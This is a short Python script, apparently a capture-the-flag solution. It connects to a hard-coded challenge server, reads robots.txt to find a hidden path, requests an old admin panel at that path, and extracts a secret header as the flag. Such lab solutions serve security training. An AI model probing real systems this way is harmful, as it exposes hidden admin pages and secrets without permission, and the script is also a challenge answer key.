import socket

def get_flag():
    host = "98.94.69.132"
    port = 32448
    
    print("[*] Connecting to the challenge server...")
    try:
        # Step 1: Query robots.txt to discover the hidden path
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5.0)
        s.connect((host, port))
        
        print("[*] Requesting robots.txt...")
        s.sendall(b"GET /robots.txt HTTP/1.0\r\n\r\n")
        
        resp = b""
        while True:
            chunk = s.recv(1024)
            if not chunk:
                break
            resp += chunk
        s.close()
        
        response_str = resp.decode('utf-8', errors='ignore')
        print("[+] Response from /robots.txt:")
        print(response_str)
        
        # Step 2: Request the forbidden admin panel /admin_old_panel/
        print("[*] Requesting /admin_old_panel/...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5.0)
        s.connect((host, port))
        s.sendall(b"GET /admin_old_panel/ HTTP/1.0\r\n\r\n")
        
        resp = b""
        while True:
            chunk = s.recv(1024)
            if not chunk:
                break
            resp += chunk
        s.close()
        
        response_str = resp.decode('utf-8', errors='ignore')
        print("[+] Response from /admin_old_panel/:")
        print(response_str)
        
        # Extract X-Admin-Secret header
        for line in response_str.splitlines():
            if "X-Admin-Secret:" in line:
                flag = line.split("X-Admin-Secret:")[1].strip()
                print(f"\n[!] FLAG FOUND: {flag}\n")
                return flag
                
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    get_flag()
